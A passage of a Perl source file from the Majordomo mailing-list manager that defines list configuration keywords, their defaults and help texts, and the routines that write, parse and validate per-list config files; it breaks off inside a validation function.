'di';
'ig00';
# A file to parse a majordomo mailing list config file
#
# writes into the global variable %main'config_opts
#

# $Header: /sources/cvsrepos/majordomo/config_parse.pl,v 1.71 2000/01/07 14:00:26 cwilson Exp $
# $Modified: Fri Jan  7 14:59:49 2000 by cwilson $

# this array holds the interesting info for use by all tools
%main'config_opts=();

require 'shlock.pl';

# here is the config package
package config;

$config'debug = 0; #Set to non-zero for various debugging levels

$clobber = 1; # if 0 don't empty previous list entries for configuration

@errors = (); # The config'errors array is used to store error messages 
              # if the array is not empty, it causes main'get_config()
              # to return 1.

$installing_defaults = 0; # Set to 1 when installing defaults, in case
			  # a grab_ function needs to act differently
                          # when dealing with a default item.

## Begin<doc>
## The following associative arrays are used:
##
## %known_keys(keyword,default value) -- defines the known keys in the
##                      config file. A null value implies that the
##                      string is undefined. A default value with '#!'
##                      at the beginning causes the string to be
##                      eval'ed. This is useful for substituting the
##                      list name etc into the string. If the keyword
##                      takes on a descrete set of values, the
##                      parse function MUST be grab_enum. The value of
##                      known_keys is the list of
##                      enumerated values. The separator character is 
##                      "\001". Added onto the end is the default
##                      value. If the value can take on numerous
##                      values (i.e. is an array), the value is a
##                      string with each element in the array
##                      separated by "\001".
##
## %comments(keyword, comment)  -- keeps comments for each keyword
##                      The comments are printed out when making a config
##                      file. So that they will document the use of
##                      the keyword.
##
##   %parse_function(key, function) -- The function to use to parse the
##                      value for a given key. All functions for this
##                      purpose begin with "grab_", and are in package
##                      config. The type of the function can be
##                      appended with __<type> to the name of the
##                      function. There are some special names for
##                      some of the functions. Any function that
##                      allows array values must end in _array. This
##                      allows the main parser to determine that an
##                      array syntax is allowable for the keyword.
##
##   %subsystem(keyword, subsystem) -- tells what subsystem each keyword
##                      belongs to. By default only majordomo, and
##                      resend are used as subsystems. This is meant
##                      for extentions such as majordomo-mh that
##                      allows access to the mh mail package via
##                      majordomo.
## End<doc>

# provide list of known keys. If value is '', then the key is undefined
# I.e. the action is just as though there was no keyword found.
# otherwise the value is the default value for the keyword.
# if the value starts with #!, the rest of the value is eval'ed
%known_keys = (
	'welcome',		'yes', # send welcome msg to new subscribers
	'announcements',	'yes', # send sub/unsub audits to list owner
	'get_access',		"open\001closed\001list\001list", # open, anyone can access
        'index_access',		"open\001closed\001list\001open", # closed, nobody can
        'who_access',		"open\001closed\001list\001open", # list, only list can access.
        'which_access',		"open\001closed\001list\001open", # ...more to come...
        'info_access',		"open\001closed\001list\001open", # 
        'intro_access',		"open\001closed\001list\001list", # 
        'advertise',		'', # if regexp matches address show list
        'noadvertise',		'', # if regexp matches address 
					# don't show list
	'description',		'', # description of list, one line 55 char 
        'subscribe_policy',	"open\001closed\001auto\001open+confirm\001closed+confirm\001auto+confirm\001#!\$default_subscribe_policy ? \$default_subscribe_policy : 'open'",
					 # open, closed, or auto.
        'unsubscribe_policy', "open\001closed\001auto\001open+confirm\001closed+confirm\001auto+confirm\001#!\$default_unsubscribe_policy ? \$default_unsubscribe_policy : 'open'",
					 # open, closed, or auto.
        'mungedomain',		'no', # is user@foo.com == user@host.foo.com
        'admin_passwd',		'#!"$list.admin"',   # administration password
        'strip',		'yes', # remove comments from address on list
	'date_info',		'yes', # date the info file when installed
	'date_intro',		'yes', # date the intro file when installed
	'archive_dir',		'',
# When it works use '#!$main\'filedir . "/" . $list',
# stuff for resend below
        'moderate',		'no',   # Is list moderated
        'moderator',		'',	# moderator instead of owner-list
        'approve_passwd', 	'#!"$list.pass"',
				      # password for approving postings
        'sender', 		'#!"owner-" . $list',   # Set sender name
        'maxlength', 		'40000',   # Set max article length
        'precedence', 		'bulk',   # Set/install precendence header
	'reply_to', 		'#! local($TEMP) = $list; 
	                            if ( $list =~ /-digest$/) {
				       $TEMP =~ s/-digest$//;
				       $TEMP;
				    } else { 
				       "";
				       }',
				      # Set/install reply-to header
				      # the code above sets the reply-to
				      # to null if it is not a -digest list,
				      # or the non-digest list if it is
				      # a -digest list.
        'restrict_post',	'',   # Like -I in resend
        'purge_received', 	'no', # Remove received lines
        'administrivia', 	'yes',# Enable administrivia checks
	'resend_host', 		'',   # Change the host name
        'debug', 		'no', # enable resend debugging
	'message_fronter',      '',
        'message_footer',       '',   # text to be added at bottom of posting
        'message_headers',      '',   # headers to be added to messsages
	'subject_prefix',	'',   # prefix for the subject line
	'taboo_headers',	'',   # if a header matches, review message
	'taboo_body',		'',   # if body matches, review message
# stuff for digest below
	'digest_volume',	'1',
	'digest_issue',		'1',
	'digest_work_dir',	'',
	'digest_name',		'#!$list',
	'digest_archive',	'',
	'digest_rm_footer',  '',
	'digest_rm_fronter', '',  
	'digest_maxlines',	'',
	'digest_maxdays',	'',
# general stuff below
	'comments',		'',   # comments about config file
	);

# An associative array of comments for all of the keys
# The text is wrapped and filled on output.
%comments = (
'welcome',
"If set to yes, a welcome message (and optional 'intro' file) will be
sent to the newly subscribed user.",

'announcements',
"If set to yes, comings and goings to the list will be sent to the list
owner. These SUBSCRIBE/UNSUBSCRIBE event announcements are informational
only (no action is required), although it is highly recommended that they
be monitored to watch for list abuse.",

'get_access',
"One of three values: open, list, closed. Open allows anyone
access to this command and closed completely disables the
command for everyone. List allows only list members access,
or if restrict_post is defined, only the addresses in those
files are allowed access.",

'index_access',
"One of three values: open, list, closed. Open allows anyone
access to this command and closed completely disables the
command for everyone. List allows only list members access,
or if restrict_post is defined, only the addresses in those
files are allowed access.",

'who_access',
"One of three values: open, list, closed. Open allows anyone
access to this command and closed completely disables the
command for everyone. List allows only list members access,
or if restrict_post is defined, only the addresses in those
files are allowed access.",

'which_access',
"One of three values: open, list, closed. Open allows anyone
access to this command and closed completely disables the
command for everyone. List allows only list members access,
or if restrict_post is defined, only the addresses in those
files are allowed access.",

'info_access',
"One of three values: open, list, closed. Open allows anyone
access to this command and closed completely disables the
command for everyone. List allows only list members access,
or if restrict_post is defined, only the addresses in those
files are allowed access.",

'intro_access',
"One of three values: open, list, closed. Open allows anyone
access to this command and closed completely disables the
command for everyone. List allows only list members access,
or if restrict_post is defined, only the addresses in those
files are allowed access.",

'advertise',
"If the requestor email address matches one of these
regexps, then the list will be listed
in the output of a lists command.
Failure to match any regexp excludes the list from
the output. The regexps under noadvertise override these regexps.",
				
'comments',
"Comment string that will be retained across config file rewrites.",

'noadvertise',
"If the requestor name matches one of these
regexps, then the list will not be listed
in the output of a lists command.
Noadvertise overrides advertise.",
				
'description',
"Used as description for mailing list
when replying to the lists command.
There is no quoting mechanism, and
there is only room for 50 or so
characters.",

'subscribe_policy', 
"One of three values: open, closed, auto; plus an optional
modifier: '+confirm'.  Open allows people to subscribe themselves to
the list. Auto allows anybody to subscribe anybody to the list without
maintainer approval. Closed requires maintainer approval for all
subscribe requests to the list.  Adding '+confirm', ie,
'open+confirm', will cause majordomo to send a reply back to the
subscriber which includes a authentication number which must be sent
back in with another subscribe command.",

'unsubscribe_policy', 
"One of three values: open, closed, auto; plus an optional modifier:
'+confirm'.  Open allows people to unsubscribe themselves from the
list. Auto allows anybody to unsubscribe anybody to the list without
maintainer approval. The existence of the file <listname>.auto is the
same as specifying the value auto.  Closed requires maintainer
approval for all unsubscribe requests to the list. In addition to the
keyword, if the file <listname>.closed exists, it is the same as
specifying the value closed. Adding '+confirm', ie, 'auto+confirm',
will cause majordomo to send a reply back to the subscriber if the
request didn't come from the subscriber. The reply includes a
authentication number which must be sent back in with another
subscribe command.  The value of this keyword overrides the value
supplied by any existent files.",

'mungedomain', 
"If set to yes, a different method is used to determine a matching
address.  When set to yes, addresses of the form user\@dom.ain.com are
considered equivalent to addresses of the form user\@ain.com. This
allows a user to subscribe to a list using the domain address rather
than the address assigned to a particular machine in the domain. This
keyword affects the interpretation of addresses for subscribe,
unsubscribe, and all private options.",

'admin_passwd',
"The password for handling administrative
tasks on the list.",

'strip',
"When adding address to the list, strip off all
comments etc, and put just the raw address in the
list file.  In addition to the keyword, if the file
<listname>.strip exists, it is the same as
specifying a yes value. That yes value is overridden
by the value of this keyword.",

'date_info',
"Put the last updated date for the info file at the
top of the info file rather than having it appended
with an info command. This is useful if the file is being
looked at by some means other than majordomo (e.g. finger).",

'date_intro',
"Put the last updated date for the intro file at the
top of the intro file rather than having it appended
with an intro command. This is useful if the file is being
looked at by some means other than majordomo (e.g. finger).",

'moderate',
"If yes, all postings to the list will be
bounced to the moderator for approval.",

'moderator',
"Address for directing posts which require approval. Such
approvals might include moderated mail, administrivia traps,
and restrict_post authorizations. If the moderator address
is not set, it will default to the list-approval address.",

'approve_passwd',
"Password to be used in the approved header
to allow posting to moderated list, or
to bypass resend checks.",

'sender',
"The envelope and sender address for the
resent mail. This string has \"\@\" and the value
of resend_host appended to it to make a
complete address. For majordomo, it provides the sender address
for the welcome mail message generated as part of the subscribe command.",

'maxlength',
"The maximum size of an unapproved message in characters. When used
with digest, a new digest will be automatically generated if the size
of the digest exceeds this number of characters.",

'precedence',
"Put a precedence header with value <value>
into the outgoing message.",

'reply_to',
"Put a reply-to header with value <value>
into the outgoing message. If the token \$SENDER is used, then the
address of the sender is used as the value of the reply-to header.
This is the value of the reply-to header for digest lists.",

'restrict_post',
"If defined, only addresses listed in these files (colon or
space separated) can post to the mailing list. By default,
these files are relative to the lists directory. These files
are also checked when get_access, index_access, info_access,
intro_access, which_access, or who_access is set to 'list'.
This is less useful than it seems it should be since there
is no way to create these files if you do not have access to
the machine running resend. This mechanism will be replaced
in a future version of majordomo/resend.",

'resend_host',
"The host name that is appended to all address
strings specified for resend.",

'purge_received',
"Remove all received lines before resending the message.",

'administrivia',
"Look for administrative requests (e.g. subscribe/unsubscribe) and forward
them to the list maintainer instead of the list.",

'debug',
"Don't actually forward message, just go though the motions.",

'archive_dir',
"The directory where the mailing list archive is kept. This item does
not currently work. Leave it blank.",

'message_fronter',
"Text to be prepended to the beginning of all messages posted to the list.
The text is expanded before being used. The following expansion tokens
are defined: \$LIST - the name of the current list, \$SENDER - the
sender as taken from the from line, \$VERSION, the version of
majordomo. If used in a digest, only the expansion token _SUBJECTS_ is
available, and it expands to the list of message subjects in the digest",

'message_footer',
"Text to be appended at the end of all messages posted to the list.
The text is expanded before being used. The following expansion tokens
are defined: \$LIST - the name of the current list, \$SENDER - the
sender as taken from the from line, \$VERSION, the version of
majordomo. If used in a digest, no expansion tokens are provided",

'message_headers',
"These headers will be appended to the headers of the posted message.
The text is expanded before being used. The following expansion tokens
are defined: \$LIST - the name of the current list, \$SENDER - the
sender as taken from the from line, \$VERSION, the version of
majordomo.",

'subject_prefix',
"This word will be prefixed to the subject line, if it is not already
in the subject. The text is expanded before being used. The following
expansion tokens are defined: \$LIST - the name of the current list,
\$SENDER - the sender as taken from the from line, \$VERSION, the
version of majordomo.",

'taboo_headers',
"If any of the headers matches one of these regexps, then the message
will be bounced for review.",
				
'taboo_body',
"If any line of the body matches one of these regexps, then the message
will be bounced for review.",
				
'digest_volume',
"The current volume number",

'digest_issue',
"The issue number of the next issue",

'digest_work_dir',
"The directory used as scratch space for digest. Don't 
change this unless you know what you are doing",

'digest_name',
"The subject line for the digest. This string has the volume
 and issue appended to it.",

'digest_archive',
"The directory where the digest archive is kept. This item does
not currently work. Leave it blank.",

'digest_rm_footer', "The value is the name of the list that applies
the header and footers to the messages that are received by
digest. This allows the list supplied headers and footers to be
stripped before the messages are included in the digest.",

'digest_rm_fronter',
'Works just like digest_rm_footer, except it removes the front material.',

'digest_maxlines',
"automatically generate a new digest when the size of the digest exceeds
this number of lines.",

'digest_maxdays',
"automatically generate a new digest when the age of the oldest article in
the queue exceeds this number of days.",
);

# match commands to their subsystem, by default only 4 subsystems
# exist, majordomo, resend, digest and config.
%subsystem = ( 
	'welcome',		'majordomo',
	'announcements',	'majordomo',
	'get_access',		'majordomo',
        'index_access',		'majordomo',
        'info_access',		'majordomo',
        'intro_access',		'majordomo',
        'who_access',		'majordomo',
	'which_access',		'majordomo',
        'advertise',		'majordomo',
        'noadvertise',		'majordomo',
	'description',		'majordomo',
        'subscribe_policy', 	'majordomo',
        'unsubscribe_policy', 	'majordomo',
        'mungedomain',		'majordomo',
        'admin_passwd',		'majordomo',
        'strip',		'majordomo',
	'date_info',		'majordomo',
	'date_intro',		'majordomo',
	'archive_dir',		'majordomo',
# stuff for resend below
        'moderate',		'resend',
        'moderator',		'resend',
        'approve_passwd',	'resend',
        'sender', 		'majordomo,resend,digest',
        'maxlength', 		'resend,digest',
        'precedence', 		'resend,digest',
        'reply_to', 		'resend,digest',
        'restrict_post',	'resend',
        'purge_received', 	'resend',
        'administrivia', 	'resend',
	'resend_host', 		'resend',
        'debug', 		'resend',
	'message_fronter',      'resend,digest',
	'message_footer',       'resend,digest',
	'message_headers',      'resend,digest',
	'subject_prefix',       'resend',
	'taboo_headers',	'resend',
	'taboo_body', 		'resend',
# digest here
	'digest_volume',	'digest',
	'digest_issue',		'digest',
	'digest_work_dir',	'digest',
	'digest_name',		'digest',
	'digest_archive',	'digest',
	'digest_rm_footer',  'digest',
	'digest_rm_fronter', 'digest',  
	'digest_maxlines',	'digest',
	'digest_maxdays',	'digest',
# general stuff here
	'comments',		'config',
);

# match a parse function to a keyword
# the parse function will be called to parse the value string for
# the keyword
%parse_function = (
	'welcome',		'grab_bool',
	'announcements',		'grab_bool',
	'get_access',		'grab_enum',
        'index_access',		'grab_enum',
        'info_access',		'grab_enum',
        'intro_access',		'grab_enum',
        'who_access',		'grab_enum',
        'which_access',		'grab_enum',
        'advertise',		'grab_regexp_array',
        'noadvertise',		'grab_regexp_array',
	'description',		'grab_string',
        'subscribe_policy', 	'grab_enum',
        'unsubscribe_policy', 	'grab_enum',
        'mungedomain',		'grab_bool',
        'admin_passwd',		'grab_word',
        'strip',		'grab_bool',
	'date_info',		'grab_bool',
	'date_intro',		'grab_bool',
	'archive_dir',		'grab_absolute_dir',
# stuff for resend below
        'moderate',		'grab_bool',
        'moderator',		'grab_word',
        'approve_passwd', 	'grab_word',
        'sender', 		'grab_word',
        'maxlength', 		'grab_integer',
        'precedence', 		'grab_word',
	'reply_to', 		'grab_word',
        'restrict_post',	'grab_restrict_post',
        'purge_received', 	'grab_bool',
        'administrivia', 	'grab_bool',
	'resend_host', 		'grab_word',
        'debug', 		'grab_bool',
	'message_fronter',      'grab_string_array',
	'message_footer',       'grab_string_array',
	'message_headers',      'grab_string_array',
	'subject_prefix',	'grab_word',
        'taboo_headers',	'grab_regexp_array',
        'taboo_body',		'grab_regexp_array',
# stuff for digest below
	'digest_volume',	'grab_integer',
	'digest_issue',		'grab_integer',
	'digest_work_dir',	'grab_absolute_dir',
	'digest_name',		'grab_string',
	'digest_directory',	'grab_absolute_dir',
	'digest_archive',	'grab_absolute_dir',
	'digest_rm_footer',     'grab_word',
	'digest_rm_fronter',    'grab_word',  
	'digest_maxlines',	'grab_integer',
	'digest_maxdays',	'grab_integer',
# general stuff below
	'comments',		'grab_string_array',
	);



#### writeconfig
#    is called to create up a default config file
#    if majordomo runs and access a list for which no config
#    file exists. The config file must already be locked.
#
# It is also called in response to the majordomo command "writeconfig"

sub writeconfig {
    local($listdir,$list) = @_;
    local($key,$intro,$type,$value,$default,$subsystem,$comment) = ();
    local($op) = '=';
    local($oldumask) = umask($config_umask);

    
    format OUT =

	@<<<<<<<<<<<<<<<<<<< @<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
     $key,           $intro
	^<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< ~~
     $comment
@<<<<<<<<<<<<<<<<<< @<< @<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
$key,		 $op, $value
.
    
    &main'open_temp(OUT, "$listdir/$list.config.out") 
      || &main'abort("Can't create new config file $listdir/$list.config.out");
    umask($oldumask);

$installing_defaults = 1;

foreach $key (sort (keys(%known_keys))) {
    local($enum,@enum);
    undef $enum;
    
    $type = $parse_function{$key};
    $type =~ s/^grab_//; # remove the grab_ prefix
    $type =~ s/^.*__//; # If we have an explicit type, get it
    
    @enum = split(/\001/,$known_keys{$key}) if $type eq "enum";
    $default = pop(@enum); # Remove the default
    
    $value = $main'config_opts{$list,$key};#';
    $value = ("no","yes")[$value] if $type eq "bool";
    
    $default = ($known_keys{$key} eq '' 
		? "undef" 
		: &get_def($key, $known_keys{$key}, $list));
    $default = ("no","yes")[$default] if $type eq "bool";
    $default =~ s/\001/;/g;
    $subsystem = $subsystem{$key};
    
    $enums = join(';',@enum[$[..$#enum]) if $type eq "enum";
    
    $intro = "[$type] ($default) <$subsystem>";
    
    $intro .= " /$enums/" if $type eq "enum";
    
    $comment = (defined $comments{$key} ? $comments{$key} : " ");

    if ($type =~ /_array/) {
	# output items in array normal form
	local($lval) = $value;
	$value = "END";
	$op = '<<';
	write(OUT);
	
	
	# handle the - escapes. We have to be careful about ordering
	# the rules so that we don't accidently trigger a substitution
	# if there is a - at the beginning of an entry, double it
	# so that the doubled - can be striped when read in later
	$lval =~ s/^-/--/g;		# start with -'ed line
	$lval =~ s/\001-/\001--/g;	# embedded line starting with -
	
	# In standard form, empty lines are lines that have only
	# a '-' on the line.
	$lval =~ s/^\001/-\001/g;		# start with blank line
	$lval =~ s/\001\001/\001-\001/g;	# embedded blank line
	$lval =~ s/\001$/\001-/g;               # trailing blank line

	# if there is space, protect it with a -
	$lval =~ s/^(\s)/-$1/g;		# the first line
	$lval =~ s/\001(\s)/\001-$1/g;	# embedded lines
	
	# now that all of the escapes are processed, get it ready
	# to be printed.
	$lval =~ s/\001/\n/g;
	
	print OUT $lval, "\nEND\n" 
	    || &main'abort("Error writing config file for $list, $!");
	
	$op = '=';
    } else { 
	write(OUT)
	    || &main'abort("Error writing config file for $list, $!");
    }
}

$installing_defaults = 0;

close(OUT);

# I have to post process the output to put the %#@^& comment character
# in. I can't do this in a forked process without getting a mix of the
# stdin to the parent and the child with Perl 4.019.

open(MCONFIG, "> $listdir/$list.config") ||
		 &main'abort( "Can't create new config file $listdir/$list.config");

print MCONFIG <<EOS;
# The configuration file for a majordomo mailing list.
# Comments start with the first # on a line, and continue to the end
# of the line. There is no way to escape the # character. The file
# uses either a key = value for simple (i.e. a single) values, or uses
# a here document
#     key << END 
#     value 1
#     value 2
#     [ more values 1 per line]
#     END 
# for installing multiple values in array types. Note that the here
# document delimiter (END in the example above) must be the same at the end
# of the list of entries as it is after the << characters.
# Within a here document, the # sign is NOT a comment character.
# A blank line is allowed only as the last line in the here document.
#
# The values can have multiple forms:
#
#	absolute_dir -- A root anchored (i.e begins with a /) directory 
#	absolute_file -- A root anchored (i.e begins with a /) file 
#	bool -- choose from: yes, no, y, n
#	enum -- One of a list of possible values
#	integer -- an integer (string made up of the digits 0-9,
#		   no decimal point)
#	float -- a floating point number with decimal point.
#	regexp -- A perl style regular expression with
# 		  leading and trailing /'s.
#	restrict_post -- a series of space or : separated file names in which
#                        to look up the senders address
#	            (restrict-post should go away to be replaced by an
#		     array of files)
#	string -- any text up until a \\n stripped of
#		  leading and trailing whitespace
#	word -- any text with no embedded whitespace
#
# A blank value is also accepted, and will undefine the corresponding keyword.
# The character Control-A may not be used in the file.
#
# A trailing _array on any of the above types means that that keyword
# will allow more than one value.
#
# Within a here document for a string_array, the '-' sign takes on a special
# significance.
#
#     To embed a blank line in the here document, put a '-' as the first
#       and ONLY character on the line.
#
#     To preserve whitespace at the beginning of a line, put a - on the
#       line before the whitespace to be preserved
#
#     To put a literal '-' at the beginning of a line, double it.
#
#
# The default if the keyword is not supplied is given in ()'s while the 
# type of value is given in [], the subsystem the keyword is used in is
# listed in <>'s. (undef) as default value means that the keyword is not
# defined or used.
EOS

open(IN, "< $listdir/$list.config.out") ||
	 &main'abort( "Can't create new config file $listdir/$list.config.out");

while (<IN>) {
    s/^(\t)(\S+)/$1# $2/; # prepend a '# ' to any line with a tab at the
    # beginning preserving indentation.
    print(MCONFIG) ||
	&main'abort("Couldn't write new config for $list, $!");
}

close(MCONFIG);
close(IN);
unlink("$listdir/$list.config.out");
}

#### handle_flag_files
# This is a compatibility routine for the non-config file 
# based version of majordomo. It looks for the flag files, and
# sets the corresponding config file parameters.

sub handle_flag_files {
  local($listdir, $list) = @_;

  if ( -e "$listdir/$list.private") {
      $main'config_opts{$list,"get_access"} = "closed";
      $main'config_opts{$list,"index_access"} = "closed";
      $main'config_opts{$list,"who_access"} = "closed";
      $main'config_opts{$list,"which_access"} = "closed"; 
  }

  $main'config_opts{$list,"subscribe_policy"} = "closed"
      if ( -e "$listdir/$list.closed");

  $main'config_opts{$list,"unsubscribe_policy"} = "closed"
      if ( -e "$listdir/$list.closed");

  if ( -e "$listdir/$list.auto" && -e "$listdir/$list.closed") {
      push(@errors,
	"Both listname.auto and listname.closed exist. Choosing closed\n"); 
      } else {
         $main'config_opts{$list,"subscribe_policy"} = "auto" 
		if ( -e"$listdir/$list.auto"); 

         $main'config_opts{$list,"unsubscribe_policy"} = "auto" 
		if ( -e"$listdir/$list.auto"); 
      }

  $main'config_opts{$list,"strip"} = 1 if ( -e "$listdir/$list.strip");
  $main'config_opts{$list,"noadvertise"} = "/.*/"
                               if ( -e "$listdir/$list.hidden");
}

########
#
# The function that does all of the real work.
#     Called with a list directory, a list name, and optionally a flag
#     that indicates the config file is already locked if true (and
#     should be left locked on return).
#
# List config file locking is different than other files in that a
# distinct lock file is used instead of just lopen() locking because
# it's easier to manage a persistent lock than to try to keep the file
# open (and thus locked) and pass the filehandle around.
#
sub main'get_config {
  local($listdir, $list, $locked) = @_;
  local($parse, $here_doc, $stop, $end) = ();
  $end = 0;

  @errors = ();

  print STDERR "get_config($listdir, $list)\n" if $debug > 1;

  if ($main'config_opts{$list} && $clobber) { 
	# hey a reload, better clobber all previous
	# entries pertaining to this list
    local($i);
    print STDERR "unloading entries for $list\n" if $debug > 1;
    foreach $i (keys(%known_keys)) {
	undef $main'config_opts{$list,"$i"};
    }
  }

  $main'config_opts{$list,''} = '1'; # set a flag to indicate that we 
                                     # have parsed the config file for
				     # this list
  print STDERR "adding site-wide defaults\n" if $debug > 1; 

    $installing_defaults = 1;

    foreach $i (keys(%known_keys)) {
	$main'config_opts{$list,$i} = 
			&get_def($i, $known_keys{$i}, $list);
    }

    $installing_defaults = 0;


  print STDERR "Overriding with existing config files\n" if $debug > 1;
  &handle_flag_files($listdir, $list); # this looks for files of 
                                       # the form listname.function

  unless ($locked) {
    &main'set_lock("$listdir/$list.config.LOCK") ||
      &main'abort( "Can't get lock for $listdir/$list.config");
  }

  print("making default\n") 
    if ($debug > 1) && (! -e "$listdir/$list.config");

  &writeconfig($listdir, $list)
		 unless -e "$listdir/$list.config" ;

  print STDERR "parsing config get_config($listdir, $list)\n" if $debug > 1;
  open(CONFIG, "$listdir/$list.config")
			 || &main'abort( "Can't open $listdir/$list.config");

  while ($_ = <CONFIG>) {

    next if /^\s*(#|$)/;   # remove comment and blank lines
    chop $_;               # remove the trailing \n
    s/#.*//;               # remove comments at the end of lines

    $here_doc = 0;

    ($key,$value) = split(/=/, $_, 2); # try splitting on =
    if ($key =~ /\<\</) {  # if it turns out that the split has << in it
	($key,$value) = split(/\<\</, $_, 2); # then split on <<
	$here_doc = 1;     # and tell the later part of the parse
                           # that it is a here document
	}

    ($key) =~ tr/A-Z/a-z/; # cannonicalize key to lower case
    $key =~ s/^\s*//;      # strip whitespace from front of key
    $key =~ s/\s*$//;      # strip whitespace from rear of key
    $value =~ s/^\s*//;    # strip whitespace from front of value
    $value =~ s/\s*$//;    # strip whitespace from rear of value

	 # is the key defined ?
    do { push(@errors,"unknown key |$key| in file $list.config at line $.\n");
	 next; }     if ( ! defined($known_keys{$key}));

	 # is the parse function defined?
    do { push(@errors,
    "unknown parse function for key |$key| in file $list.config at line $.\n");
	 next; }     if ( ! defined($parse_function{$key}));


	 # assign the parse function toa simple variable for ease
	 # of use later on.
    $parse = $parse_function{$key};

    if (!$here_doc) { # if it is a simple value, take the
		      # output of the parse function as its value.
	   $main'config_opts{$list,$key} = &$parse($value, $list, $key);
    } else { # iterate over the lines in the here doc.
             # make sure the keyword is supposed to take array values
        do { push(@errors,
	    "|$key| does not take multiple values at line $.\n");
		 next; } if ($parse !~ /_array$/) ;
	$stop = $value;                      # set the end token
	undef $main'config_opts{$list,$key}; # clear default value


        # call the array parse function for each value in the here document
	# this loop also makes sure that blank lines don't occur
        # in the here doument except just beofre the end marker.
	# This allows us to discover errors more easily.

	while ($value = <CONFIG>) {
	    $value =~ s/^\s*//;  # strip whitespace front 
	    $value =~ s/\s*$//;  # strip whitespace rear
	    $end = 0, last if $stop eq $value;
	    push(@errors, 
		"invalid blank line found at line ",  $. - 1, "\n"), $end = 0,
		     last if $end == 1;

    	    if ( $value eq '' ) { # stop accumulating on empty line
	                         # unless it is right b4 $stop
		$end =	1;
		}

	    # call the parse function for every value in the here document
	    # take the output of the parse function and add it to the
	    # string representation of the array. In the string representation,
	    # array values are separated by the ^A character.

 	    if (defined($main'config_opts{$list,$key})) {
	   	    $main'config_opts{$list,$key} .=  "\001" .
			&$parse($value, $list, $key);
		} else { # we are starting an array
	   	    $main'config_opts{$list,$key} =
			&$parse($value, $list, $key);
		}
	}
     }
  }

close(CONFIG);

&main'free_lock("$listdir/$list.config.LOCK") unless $locked;

print STDERR @errors if $debug > 1;

return 1 if @errors;
return 0; 
}

#####
#
# The grab functions that validate values are defined below:
#
#  grab_absolute_dir - looks for root anchored existing directory
#			uses @main'safedirs to determine valid
#			paths.
#  grab_absolute_file - looks for root anchored existing file
#			uses @main'safefiles to determine valid
#			paths.
#
#  grab_bool - parses boolean options "yes", "y", "no", "n"
#
#  grab_enum -- validates an enumerated value from a sequence
#
#  grab_integer -- validates an integer
#
#  grab_regexp -- validates a regexp. Must have leading and trailing
#		  match delimiters.
#
#  grab_restrict_post -- validates the existance of files listed
#
#  grab_string -- reads/returns a string. No checking is done.
#
#  grab_word - grabs one whitespace delimited word. Complains if more
#              than 1 word. 
####

sub grab_absolute_dir {
 local($dir, $list, $key) = @_;
 
 return("");
 return ("") if $dir eq "undef";
 return ("") if $dir eq "";

 push(@errors, "Relative path element '..' in $dir is not allowed\n")
		if $dir =~ m#/\.\./# ;

 push(@errors, "Anchoring path element '.' in $dir is not allowed\n")
		if $dir =~ m#/\./# ;

 push(@errors, "$dir must be root anchored\n")
		if $dir !~ m#^/# ;

 foreach  $i (@main'safedirs) {
  if ($dir  =~ m#$i#) {
	return $dir if ( -d $dir );
	push(@errors, "Directory $dir doesn't exist\n");
	return "";
   }
  }

  push(@errors, "Directory $dir is not safe\n");
  return "";
}

sub grab_absolute_file {
 local($file) = @_;

 return("");
 push(@errors, "Relative path element '..' in $file is not allowed\n")
		if $file =~ m#/\.\./# ;

 push(@errors, "Anchoring path element '.' in $file is not allowed\n")
		if $file =~ m#/\./# ;

 push(@errors, "$file must be root anchored\n")
		if $file != m#^/# ;

 foreach  $i (@main'safefiles) {
  if ($file  =~ "m#$i#") {
	return $file if ( -f $file );
	push(@errors, "File $file doesn't exist\n");
	return "";
   }
  }

  push(@errors, "File $file is not safe\n");
  return "";
}

sub grab_bool {
local($bool) = @_;

  $bool =~ tr/A-Z/a-z/;

  return 1 if $bool eq "yes";
  return 1 if $bool eq "y";
  return 0 if $bool eq "no";
  return 0 if $bool eq "n";

  push(@errors,"Unknown boolean value $bool in config file at line $.\n");
  return 0;
}

sub grab_enum {
    local($value, $list, $key) = @_;
    local($i, @enum) = "";
    local($default_value) = "";

    if ($installing_defaults) { # the value when installing defaults is
				# the entire enumerated list, with the
				# default at the end
	@enum = split(/\001/, $value);
	$value = pop(@enum);

	$default_value = $value;

	if ( $value =~ s/^#!// ) {
	    $default_value = $value;

	    $value = eval("$value");
	    push(@errors, $@) if $@ ne "";

	}

	#
	# duplicate here for better error message during
	# default setup.
	#
	foreach $i (@enum) {
	    return $value if $value eq $i;
	}
	push(@errors, "$value at line $. is not a valid value.\n" .
	     "This value was taken from the default list.\n" .
	     "It was produced by $default_value\n" . 
	     "So it is likely to be taken from majordomo.cf.\n" .
	     "BTW, the line number shown here is the line number of the last line and not relevant.\n" .
	     "The key to which the value was assigned was $key " . "\n" .
	     "Valid values are: " . join(';', @enum) . "\nlist was $list" );

	return "";


    } else {
	@enum = split(/\001/, $known_keys{$key});
	pop(@enum);
    }
    foreach $i (@enum) {
	return $value if $value eq $i;
    }
    push(@errors, "$value at line $. is not a valid value.\n" .
	 "Valid values are: " . join(';', @enum) . "\nlist was $list" . 
         " the key was $key " . "\n" . 
         "installing_default was $installing_defaults" . "\n");


    return "";
}

sub grab_integer {
	local($num, $list, $key)=@_;
        return($num) if $num =~ /^[1-9][0-9]*$/;		
        return($num) if $num =~ /^$/;		
        push(@errors, "$num is not an integer at line $.\n");
	return "";
}

sub grab_integer_array {
	local($value, $list, $key) = @_;
	local(@value_array) = split(/\001/,$value);
	local(@return_array, @local_errors, $num) = ();

	foreach $num (@value_array){
            push(@local_errors,
	        "integer |$num| contains a ^A at line $.\n"), next
	            if $re =~ /\001/;

	    push(@return_array, $num) if $num =~ /^[1-9][0-9]*$/;
	    push(@return_array, $num) if $num =~ /^$/;		
	    push(@local_errors, "$num is not an integer at line $.\n");
 	}

        if (@local_errors) {
              push(@errors, @local_errors);
	      return "";
	      }
        return (join("\001", @return_array));
}

sub grab_float {
	local($num)=@_;
        return($num) if $num =~ /^[0-9][0-9]*\.[0-9]+$/;		
        return($num) if $num =~ /^$/;		
        push(@errors, "$num is not a floating point number at line $.\n");
	return "";
}

sub grab_float_array {
	local($value, $list, $key) = @_;
	local(@value_array) = split(/\001/,$value);
	local(@return_array, @local_errors, $num) = ();

	foreach $num (@value_array){
            push(@local_errors,
